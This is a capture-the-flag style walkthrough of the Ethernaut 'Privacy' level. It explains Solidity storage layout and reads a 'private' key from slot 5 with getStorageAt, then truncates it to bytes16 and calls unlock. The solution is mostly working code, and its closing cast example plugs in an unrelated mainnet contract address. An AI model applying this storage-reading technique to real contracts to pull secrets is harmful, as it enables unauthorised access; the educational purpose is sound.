### Level 12 Privacy
To unlock this contract, Inspect the storage of the Privacy contract to extract the _key value

## Prerequisites
- Layout of storage variables in solidity
- Reading a storage slot in a contract 
- Fixed size byte arrays
- understanding how parameter parsing works
- understanding how casting works

## solution
The Privacy contract has been locked, to unlock this contract 
we need to call the unlock function with the value of (bytes16 _key).
From the unlock function, we can see the ``bytes16 _key`` is the value of the third entry
in the ``bytes32[3] private data`` variable declared in the contract.

We have to read the value of ``data[2]`` from storage. To do this we have to determine the slot in storage.

First we have `` bool public locked = true`` which is 1 byte -> `` slot 0 ``
`` uint256 ID = block.timestamp `` which is 32 bytes -> `` slot 1 `` 
``uint8 flattening`` -> 1 byte -> `` slot 2 ``
``uint8 denomination`` -> 1 byte -> `` slot 2 ``
``uint16 awkwardness`` -> 2 bytes -> `` slot 2 ``
`` bytes32[3] data `` array data starts at a new slot, this starts at slot 3
each entry is a bytes32 type so they take up their own slot
i.e slot 3, 4, and 5.

Now that we have established slot 5 as the location of the third entry and our key.

To read the storage data in slot 5:
```javascript
 key = await web3.eth.getStorageAt(contract.address, 5); 
 
 // Output: '0x5dd89f7b81030395311dd63330c747fe293140d92dbe7eee1df2a8c233ef8d6d'
```

The key is 32 bytes. But the require check in unlock converts the data[2] value to a 16 bytes.
```js
 bytes16(data[2])
```
This will truncate the last 16 bytes of the data and return only the first 16 bytes
So we need the '0x' prefix and the first 16 bytes
```js
key = key.slice(0, 34);

// output - 0x5dd89f7b81030395311dd63330c747fe
```

Call unlock  funtion with the value of key
```javascript
await contract.unlock(key);
```
Verify unlock by:
```js
  await contract.locked();

  // Output - false
```
To read contract storage in your foundry project use cast
```javascript
cast storage [contract.address] [slot]
cast storage 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 5
```
